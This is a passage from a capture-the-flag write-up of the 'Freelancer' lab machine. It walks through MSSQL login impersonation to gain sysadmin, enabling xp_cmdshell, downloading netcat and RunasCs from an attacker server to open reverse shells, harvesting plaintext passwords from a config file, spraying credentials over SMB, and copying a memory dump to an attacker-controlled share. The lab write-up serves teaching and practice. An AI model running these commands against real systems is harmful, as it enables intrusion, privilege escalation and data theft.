</span></span></span></code></pre></div><p>I can see that the response is <code>1</code>, if I run it without the <code>EXECUTE AS</code> command I get <code>0</code>. In <code>MSSQL</code>, when we get <code>1</code> it means that the user is a member of the specified role, <code>0</code> means it is not. Since we got <code>1</code> this means that we are able to execute <code>sysadmin</code> commands as <code>sa</code> user.</p><p>We could then attempt to add our user <code>Freelancer_webapp_user</code> to <code>sysadmin</code> role impersonating <code>sa</code> user. For this we run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>EXECUTE</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=n>LOGIN</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;sa&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>EXEC</span><span class=w> </span><span class=n>sp_addsrvrolemember</span><span class=w> </span><span class=s1>&#39;Freelancer_webapp_user&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;sysadmin&#39;</span><span class=w>
</span></span></span></code></pre></div><p>and then we run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=n>IS_SRVROLEMEMBER</span><span class=p>(</span><span class=s1>&#39;sysadmin&#39;</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></div><p>this means that now our user <code>Freelancer_webapp_user</code> is a member of <code>sysadmin</code> role.</p><p>Now, I re-run the command to enable <code>xp_cmdshell</code> (to execute system commands):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>EXEC</span><span class=w> </span><span class=n>sp_configure</span><span class=w> </span><span class=s1>&#39;Show Advanced Options&#39;</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w> </span><span class=n>RECONFIGURE</span><span class=p>;</span><span class=w> </span><span class=k>EXEC</span><span class=w> </span><span class=n>sp_configure</span><span class=w> </span><span class=s1>&#39;xp_cmdshell&#39;</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w> </span><span class=n>RECONFIGURE</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>and now it works, since it does not returns any error.</p><p>If I now I re-run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>EXEC</span><span class=w> </span><span class=n>master</span><span class=p>..</span><span class=n>xp_cmdshell</span><span class=w> </span><span class=s1>&#39;whoami&#39;</span><span class=w>
</span></span></span></code></pre></div><p>we get:</p><p><img alt="Freelancer 20" src=/pentesting/images/Freelancer_20.png></p><p>Finally, I will send myself a ping. For that, in my attacker machine, I start a <code>tcpdump</code> listener:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo tcpdump -ni tun0 icmp
</span></span></span></code></pre></div><p>and in the <code>MSSQL</code> terminal I send myself a <code>ping</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>EXEC</span><span class=w> </span><span class=n>master</span><span class=p>..</span><span class=n>xp_cmdshell</span><span class=w> </span><span class=s1>&#39;ping -n 1 10.10.16.9&#39;</span><span class=w>
</span></span></span></code></pre></div><p>where <code>10.10.16.9</code> is my attacker IP address.
In my listener I get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo tcpdump -ni tun0 icmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
</span></span></span><span class=line><span class=cl><span class=go>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
</span></span></span><span class=line><span class=cl><span class=go>19:06:34.476998 IP 10.10.11.5 &gt; 10.10.16.9: ICMP echo request, id 1, seq 90, length 40
</span></span></span><span class=line><span class=cl><span class=go>19:06:34.477022 IP 10.10.16.9 &gt; 10.10.11.5: ICMP echo reply, id 1, seq 90, length 40
</span></span></span></code></pre></div><p>so I am able to remotely execute commands in the target machine.</p><p>Then, I will go to <code>Reverse Shell Generator</code> webpage (<a href=https://www.revshells.com/ class=external-link target=_blank rel=noopener>https://www.revshells.com/</a>), select <code>PowerShell #3 (Base64)</code> payload, add my attacker IP address and listening port <code>443</code>. In my attacker machine I start a <code>netcat</code> listener along with <code>rlwrap</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span></code></pre></div><p>After attempting many things, the one that worked was using <code>wget</code> inside <code>Powershell</code> (since <code>certutil</code> was blocked). I will start a <code>HTTP</code> <code>Python</code> temporal server running exposing a <code>netcat</code> binary for <code>Windows</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 -m http.server 8000
</span></span></span></code></pre></div><p>And download the exposed file. For this in <code>MSSQL</code> console we run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>EXEC</span><span class=w> </span><span class=n>master</span><span class=p>..</span><span class=n>xp_cmdshell</span><span class=w> </span><span class=s1>&#39;powershell -command &#34;wget http://10.10.16.9:8000/nc64.exe -Outfile C:\Users\Public\Downloads\nc.exe&#34;&#39;</span><span class=w>
</span></span></span></code></pre></div><p>and then run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>EXEC</span><span class=w> </span><span class=n>master</span><span class=p>..</span><span class=n>xp_cmdshell</span><span class=w> </span><span class=s1>&#39;C:\Users\Public\Downloads\nc.exe 10.10.16.9 443 -e C:\Windows\System32\cmd.exe&#39;</span><span class=w>
</span></span></span></code></pre></div><p>Where I get a shell as <code>sql_svc</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.9] from (UNKNOWN) [10.10.11.5] 57180
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.5830]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\WINDOWS\system32&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>freelancer\sql_svc
</span></span></span></code></pre></div><p>Then, going to <code>C:\Users\sql_svc</code> directory and using <code>tree</code> command to check more directories shows something:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;cd C:\Users\sql_svc
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>cd C:\Users\sql_svc
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\sql_svc&gt;tree .
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>tree .
</span></span></span><span class=line><span class=cl><span class=go>Folder PATH listing
</span></span></span><span class=line><span class=cl><span class=go>Volume serial number is 8954-28AE
</span></span></span><span class=line><span class=cl><span class=go>C:\USERS\SQL_SVC
</span></span></span><span class=line><span class=cl><span class=go>3D Objects
</span></span></span><span class=line><span class=cl><span class=go>Contacts
</span></span></span><span class=line><span class=cl><span class=go>Desktop
</span></span></span><span class=line><span class=cl><span class=go>Documents
</span></span></span><span class=line><span class=cl><span class=go>Downloads
</span></span></span><span class=line><span class=cl><span class=go>   SQLEXPR-2019_x64_ENU
</span></span></span><span class=line><span class=cl><span class=go>       1033_ENU_LP
</span></span></span><span class=line><span class=cl><span class=go>          x64
</span></span></span><span class=line><span class=cl><span class=go>              1033
</span></span></span><span class=line><span class=cl><span class=go>              Setup
</span></span></span><span class=line><span class=cl><span class=go>                  x64
</span></span></span><span class=line><span class=cl><span class=go>       redist
</span></span></span><span class=line><span class=cl><span class=go>          VisualStudioShell
</span></span></span><span class=line><span class=cl><span class=go>              VCRuntimes
</span></span></span><span class=line><span class=cl><span class=go>       resources
</span></span></span><span class=line><span class=cl><span class=go>          1033
</span></span></span><span class=line><span class=cl><span class=go>       x64
</span></span></span><span class=line><span class=cl><span class=go>           Setup
</span></span></span><span class=line><span class=cl><span class=go>Favorites
</span></span></span><span class=line><span class=cl><span class=go>Links
</span></span></span><span class=line><span class=cl><span class=go>Music
</span></span></span><span class=line><span class=cl><span class=go>Pictures
</span></span></span><span class=line><span class=cl><span class=go>Saved Games
</span></span></span><span class=line><span class=cl><span class=go>Searches
</span></span></span><span class=line><span class=cl><span class=go>Videos
</span></span></span></code></pre></div><p>where I can see a directory called <code>SQLEXPR-2019_x64_ENU</code>. Going to <code>C:\Users\svc_sql\Downloads</code> and checking all files shows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\sql_svc\Downloads&gt;dir /S /A
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dir /S /A
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is 8954-28AE
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of C:\Users\sql_svc\Downloads
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>05/27/2024  01:53 PM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>05/27/2024  01:53 PM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>05/27/2024  01:51 PM               282 desktop.ini
</span></span></span><span class=line><span class=cl><span class=go>05/27/2024  01:52 PM    &lt;DIR&gt;          SQLEXPR-2019_x64_ENU
</span></span></span><span class=line><span class=cl><span class=go>               1 File(s)            282 bytes
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>05/27/2024  01:52 PM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>05/27/2024  01:52 PM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>05/27/2024  01:52 PM    &lt;DIR&gt;          1033_ENU_LP
</span></span></span><span class=line><span class=cl><span class=go>09/24/2019  09:00 PM                45 AUTORUN.INF
</span></span></span><span class=line><span class=cl><span class=go>09/24/2019  09:00 PM               784 MEDIAINFO.XML
</span></span></span><span class=line><span class=cl><span class=go>09/29/2023  04:49 AM                16 PackageId.dat
</span></span></span><span class=line><span class=cl><span class=go>05/27/2024  01:52 PM    &lt;DIR&gt;          redist
</span></span></span><span class=line><span class=cl><span class=go>05/27/2024  01:52 PM    &lt;DIR&gt;          resources
</span></span></span><span class=line><span class=cl><span class=go>09/24/2019  09:00 PM           142,944 SETUP.EXE
</span></span></span><span class=line><span class=cl><span class=go>09/24/2019  09:00 PM               486 SETUP.EXE.CONFIG
</span></span></span><span class=line><span class=cl><span class=go>05/27/2024  04:58 PM               724 sql-Configuration.INI
</span></span></span><span class=line><span class=cl><span class=go>09/24/2019  09:00 PM           249,448 SQLSETUPBOOTSTRAPPER.DLL
</span></span></span><span class=line><span class=cl><span class=go>05/27/2024  01:52 PM    &lt;DIR&gt;          x64
</span></span></span><span class=line><span class=cl><span class=go>               7 File(s)        394,447 bytes
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU\1033_ENU_LP
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>05/27/2024  01:52 PM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>05/27/2024  01:52 PM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>09/24/2019  09:35 PM               203 MEDIAINFO.XML
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>and after checking some of them, the file <code>C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU\sql-Configuration.INI</code> shows something:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\sql_svc\Downloads&gt;type C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU\sql-Configuration.INI
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>type C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU\sql-Configuration.INI
</span></span></span><span class=line><span class=cl><span class=go>[OPTIONS]
</span></span></span><span class=line><span class=cl><span class=go>ACTION=&#34;Install&#34;
</span></span></span><span class=line><span class=cl><span class=go>QUIET=&#34;True&#34;
</span></span></span><span class=line><span class=cl><span class=go>FEATURES=SQL
</span></span></span><span class=line><span class=cl><span class=go>INSTANCENAME=&#34;SQLEXPRESS&#34;
</span></span></span><span class=line><span class=cl><span class=go>INSTANCEID=&#34;SQLEXPRESS&#34;
</span></span></span><span class=line><span class=cl><span class=go>RSSVCACCOUNT=&#34;NT Service\ReportServer$SQLEXPRESS&#34;
</span></span></span><span class=line><span class=cl><span class=go>AGTSVCACCOUNT=&#34;NT AUTHORITY\NETWORK SERVICE&#34;
</span></span></span><span class=line><span class=cl><span class=go>AGTSVCSTARTUPTYPE=&#34;Manual&#34;
</span></span></span><span class=line><span class=cl><span class=go>COMMFABRICPORT=&#34;0&#34;
</span></span></span><span class=line><span class=cl><span class=go>COMMFABRICNETWORKLEVEL=&#34;&#34;0&#34;
</span></span></span><span class=line><span class=cl><span class=go>COMMFABRICENCRYPTION=&#34;0&#34;
</span></span></span><span class=line><span class=cl><span class=go>MATRIXCMBRICKCOMMPORT=&#34;0&#34;
</span></span></span><span class=line><span class=cl><span class=go>SQLSVCSTARTUPTYPE=&#34;Automatic&#34;
</span></span></span><span class=line><span class=cl><span class=go>FILESTREAMLEVEL=&#34;0&#34;
</span></span></span><span class=line><span class=cl><span class=go>ENABLERANU=&#34;False&#34;
</span></span></span><span class=line><span class=cl><span class=go>SQLCOLLATION=&#34;SQL_Latin1_General_CP1_CI_AS&#34;
</span></span></span><span class=line><span class=cl><span class=go>SQLSVCACCOUNT=&#34;FREELANCER\sql_svc&#34;
</span></span></span><span class=line><span class=cl><span class=go>SQLSVCPASSWORD=&#34;IL0v3ErenY3ager&#34;
</span></span></span><span class=line><span class=cl><span class=go>SQLSYSADMINACCOUNTS=&#34;FREELANCER\Administrator&#34;
</span></span></span><span class=line><span class=cl><span class=go>SECURITYMODE=&#34;SQL&#34;
</span></span></span><span class=line><span class=cl><span class=go>SAPWD=&#34;t3mp0r@ryS@PWD&#34;
</span></span></span><span class=line><span class=cl><span class=go>ADDCURRENTUSERASSQLADMIN=&#34;False&#34;
</span></span></span><span class=line><span class=cl><span class=go>TCPENABLED=&#34;1&#34;
</span></span></span><span class=line><span class=cl><span class=go>NPENABLED=&#34;1&#34;
</span></span></span><span class=line><span class=cl><span class=go>BROWSERSVCSTARTUPTYPE=&#34;Automatic&#34;
</span></span></span><span class=line><span class=cl><span class=go>IAcceptSQLServerLicenseTerms=True
</span></span></span></code></pre></div><p>where I can see 2 passwords: <code>IL0v3ErenY3ager</code> and <code>t3mp0r@ryS@PWD</code>. I save them both in a file called <code>found_passwd.txt</code>.</p><p>I also check if I have more users in the target machine, and we have many:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\sql_svc\Downloads&gt;net user
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>net user
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User accounts for \\DC
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-------------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go>Administrator            alex.hill                carol.poland
</span></span></span><span class=line><span class=cl><span class=go>d.jones                  dthomas                  ereed
</span></span></span><span class=line><span class=cl><span class=go>Ethan.l                  evelyn.adams             Guest
</span></span></span><span class=line><span class=cl><span class=go>hking                    jen.brown                jgreen
</span></span></span><span class=line><span class=cl><span class=go>jmartinez                krbtgt                   leon.sk
</span></span></span><span class=line><span class=cl><span class=go>lkazanof                 lorra199                 maya.artmes
</span></span></span><span class=line><span class=cl><span class=go>michael.williams         mikasaAckerman           olivia.garcia
</span></span></span><span class=line><span class=cl><span class=go>samuel.turner            sdavis                   sophia.h
</span></span></span><span class=line><span class=cl><span class=go>sql_svc                  SQLBackupOperator        sshd
</span></span></span><span class=line><span class=cl><span class=go>taylor                   wwalker
</span></span></span><span class=line><span class=cl><span class=go>The command completed successfully.
</span></span></span></code></pre></div><p>I save them all in a file called <code>users.txt</code>.</p><p>Since <code>SMB</code> service was exposed I will use <code>NetExec</code> to check if these credentials work with one of these users:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.5 -u users.txt -p found_passwd.txt --continue-on-success
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.5      445    DC               [-] freelancer.htb\Administrator:IL0v3ErenY3ager STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.5      445    DC               [-] freelancer.htb\alex.hill:IL0v3ErenY3ager STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.5      445    DC               [-] freelancer.htb\carol.poland:IL0v3ErenY3ager STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.5      445    DC               [-] freelancer.htb\michael.williams:IL0v3ErenY3ager STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.5      445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.5      445    DC               [-] freelancer.htb\olivia.garcia:IL0v3ErenY3ager STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.5      445    DC               [-] freelancer.htb\taylor:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.5      445    DC               [-] freelancer.htb\wwalker:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE
</span></span></span></code></pre></div><p>and one of the credentials work: <code>mikasaAckerman:IL0v3ErenY3ager</code>.</p><p>However, from <code>sql_svc</code> shell I note that <code>mikasaAckerman</code> user is not able to connect via <code>WinRM</code> since she is not a member of <code>Remote Management Users</code> group:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\sql_svc\Downloads&gt;net localgroup &#34;Remote Management Users&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>net localgroup &#34;Remote Management Users&#34;
</span></span></span><span class=line><span class=cl><span class=go>Alias name     Remote Management Users
</span></span></span><span class=line><span class=cl><span class=go>Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Members
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-------------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go>dthomas
</span></span></span><span class=line><span class=cl><span class=go>lkazanof
</span></span></span><span class=line><span class=cl><span class=go>lorra199
</span></span></span><span class=line><span class=cl><span class=go>michael.williams
</span></span></span><span class=line><span class=cl><span class=go>wwalker
</span></span></span><span class=line><span class=cl><span class=go>The command completed successfully.
</span></span></span></code></pre></div><p>Therefore, I will use <code>RunasCs</code> (that can be downloaded from <a href=https://github.com/antonioCoco/RunasCs/releases/tag/v1.5 class=external-link target=_blank rel=noopener>its Github repository</a>) to pivot internally to <code>mikasaAckerman</code> user. For this I pass <code>RunasCs</code> binary similar as I have previously passed <code>netcat</code> binary, start a new <code>netcat</code> listener on port <code>443</code> in my attacker machine and, finally, run in the target machine <code>RunasCs</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\sql_svc\Downloads&gt;powershell -command &#34;wget http://10.10.16.9:8000/RunasCs.exe -Outfile C:\Users\Public\Downloads\runascs.exe&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>powershell -command &#34;wget http://10.10.16.9:8000/RunasCs.exe -Outfile C:\Users\Public\Downloads\runascs.exe&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads\runascs.exe mikasaAckerman IL0v3ErenY3ager cmd.exe -r 10.10.16.9:443 -t 10
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Running in session 0 with process function CreateProcessWithLogonW()
</span></span></span><span class=line><span class=cl><span class=go>[+] Using Station\Desktop: Service-0x0-49493$\Default
</span></span></span><span class=line><span class=cl><span class=go>[+] Async process &#39;C:\WINDOWS\system32\cmd.exe&#39; with pid 2396 created in background.
</span></span></span></code></pre></div><p>and in my listener I get another shell as <code>mikasaAckerman</code> user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.9] from (UNKNOWN) [10.10.11.5] 57358
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.5830]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\WINDOWS\system32&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>freelancer\mikasaackerman
</span></span></span></code></pre></div><p>where we can finally get the user flag at <code>mikasaackerman</code> Desktop.</p><hr><h2 id=nt-authority--system---administrator>NT Authority / System - Administrator
<a class=heading-link href=#nt-authority--system---administrator><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Checking <code>mikasaackerman</code> Desktop we can see a file called <code>mail.txt</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\mikasaAckerman\Desktop&gt;dir
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dir
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is 8954-28AE
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of C:\Users\mikasaAckerman\Desktop
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>05/28/2024  10:22 AM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>05/28/2024  10:22 AM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>10/28/2023  06:23 PM             1,468 mail.txt
</span></span></span><span class=line><span class=cl><span class=go>10/04/2023  01:47 PM       292,692,678 MEMORY.7z
</span></span></span><span class=line><span class=cl><span class=go>07/11/2024  11:08 PM                34 user.txt
</span></span></span><span class=line><span class=cl><span class=go>               3 File(s)    292,694,180 bytes
</span></span></span><span class=line><span class=cl><span class=go>               2 Dir(s)   2,596,708,352 bytes free
</span></span></span></code></pre></div><p>Reading it we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\mikasaAckerman\Desktop&gt;type mail.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>type mail.txt
</span></span></span><span class=line><span class=cl><span class=go>Hello Mikasa,
</span></span></span><span class=line><span class=cl><span class=go>I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the &#34;DATACENTER-2019&#34; computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
</span></span></span><span class=line><span class=cl><span class=go>I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server&#39;s CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
</span></span></span><span class=line><span class=cl><span class=go>Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
</span></span></span><span class=line><span class=cl><span class=go>Best regards,
</span></span></span></code></pre></div><p>The mail talks about a memory dump. So it is a hint that we might look for some files. Actually, as we can see, there is a file called <code>MEMORY.7z</code> at <code>mikasaackerman</code> Desktop.</p><p>I will transfer this file via <code>SMB</code>. For that I start a shared resource called <code>smb2Folder</code> on my attacker machine with the credentials <code>gunzf0x:gunzf0x123$!</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 /usr/share/doc/python3-impacket/examples/smbserver.py smb2Folder $(pwd) -smb2support -username gunzf0x -password &#39;gunzf0x123$!&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Config file parsed
</span></span></span><span class=line><span class=cl><span class=go>[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
</span></span></span><span class=line><span class=cl><span class=go>[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
</span></span></span><span class=line><span class=cl><span class=go>[*] Config file parsed
</span></span></span><span class=line><span class=cl><span class=go>[*] Config file parsed
</span></span></span><span class=line><span class=cl><span class=go>[*] Config file parsed
</span></span></span></code></pre></div><p>and in the target machine we connect to this shared resource:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\mikasaAckerman\Desktop&gt;net use \\10.10.16.9\smb2Folder /u:gunzf0x gunzf0x123$!
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>net use \\10.10.16.9\smb2Folder /u:gunzf0x gunzf0x123$!
</span></span></span><span class=line><span class=cl><span class=go>The command completed successfully.
</span></span></span></code></pre></div><p>Then copy the file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\mikasaAckerman\Desktop&gt;copy .\MEMORY.7z \\10.10.16.9\smb2Folder\
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>copy .\MEMORY.7z \\10.10.16.9\smb2Folder\
</span></span></span><span class=line><span class=cl><span class=go>        1 file(s) copied.
